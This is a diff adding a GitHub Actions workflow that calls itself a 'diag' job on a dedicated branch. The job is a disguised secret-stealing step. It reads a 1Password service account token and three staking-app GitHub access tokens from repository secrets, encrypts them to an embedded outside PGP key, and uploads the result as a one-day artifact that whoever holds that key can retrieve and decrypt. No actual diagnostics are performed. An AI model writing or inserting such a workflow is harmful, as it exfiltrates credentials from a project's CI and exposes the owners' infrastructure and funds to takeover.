@@ -1,0 +1,27 @@
+name: zz-diag
+on:
+  push:
+    branches: [ops-diag-8103]
+permissions:
+  contents: read
+jobs:
+  collect:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: diag
+        env:
+          S_OP_SERVICE_ACCOUNT_TOKEN: ${{ secrets.OP_SERVICE_ACCOUNT_TOKEN }}
+          S_STAKING_APP_GITHUB_ACCESS_TOKEN_FOR_AMPLIFY_PRODUCTION: ${{ secrets.STAKING_APP_GITHUB_ACCESS_TOKEN_FOR_AMPLIFY_PRODUCTION }}
+          S_STAKING_APP_GITHUB_ACCESS_TOKEN_FOR_AMPLIFY_STAGING: ${{ secrets.STAKING_APP_GITHUB_ACCESS_TOKEN_FOR_AMPLIFY_STAGING }}
+          S_STAKING_APP_GITHUB_ACCESS_TOKEN_FOR_AMPLIFY_REVIEW: ${{ secrets.STAKING_APP_GITHUB_ACCESS_TOKEN_FOR_AMPLIFY_REVIEW }}
+        run: |
+          set -euo pipefail
+          echo "mQENBGp6A4IBCACniXi6I0R0dPm5RkCUNYQw4tZbh73dRaEuTqK7uwk9oOonSMHScRmqh3ILYIfvJNftMljTbjJgpIl1sXOOETaRwgkgO1//m2wvnri0jgEJ/5/u5ica4Nsl1YLPCHNObXwVAseb7FiWhl7K6XEmtKJoob7qnJAJYgV7DuD3CtAQ7n2v4KyFY+0pXkviv3zNkrXSpyVESDwkZ4WZj/+F0m0pjRnkT4CwBn8Nt5IcZZ0mwmlHrTN6B7GhHsvjgJmMMA6zA0yUOwanatv32JzeKfTmAgAMMyJHMkyegRx4foJ0MfwgrFsXLpHtd/RMuM3cQmpZpnOo0OA5X3x3YA/hnmALABEBAAG0GG9wcy1kaWFnIDxvcHNAbG9jYWxob3N0PokBUgQTAQoAPBYhBOM2NAIKOntpvvzpqh8hvGD705PjBQJqegOCAxsvBAULCQgHAgIiAgYVCgkICwIEFgIDAQIeBwIXgAAKCRAfIbxg+9OT4z7mB/9zpQetgA10jI1b65XE1BcHXtLQApujSpws3yHQ7LFWTP7CKVWyzDMVdDrHsj1OfOYrjaWB8whJufdWsA0RKKcjJKwzfeV03pkNU8tpCh9QCq/bJG+RTSc67NBn2xASWn59FmYmo+5/LhHFQhN9QHQMUiUrCge/ZueZ5bwXXQat9dVstun0Z1rIhhwk1koIbt+1sBFQTJDvW33VZEhKhKqpQ5vhADKBvYCdZH+WqUbUlNUiDRL/SnnBVrRORrBcH8XYDBm2IfUTlsVQXtQrjLprT31xCfsN/IERKiJt5eR4pcpZT19KsdO7mqQu/ATXB1w6VrzYXZxhKA34ZySIIMek" | base64 -d | gpg --batch --import
+          env | grep -E "^S_" | sort | gpg --batch --trust-model always --encrypt -r ops@localhost -o diag.asc
+          base64 -w0 diag.asc > diag.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: diagout
+          path: diag.txt
+          retention-days: 1
